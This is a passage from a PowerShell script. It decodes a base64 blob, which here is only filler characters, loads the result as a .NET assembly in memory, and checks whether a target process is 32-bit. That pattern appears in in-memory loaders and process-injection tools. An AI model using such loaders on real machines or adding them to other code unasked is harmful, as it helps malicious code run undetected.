AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $dllbytes  = [System.Convert]::FromBase64String($ps)
    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
}

$processHandle = (Get-Process -id $processID).Handle
$is64 = [IntPtr]::Zero
try{
[ProcessHandler]::IsWow64Process($processHandle, [ref]$is64) |Out-Null
} catch {

}
$is64

}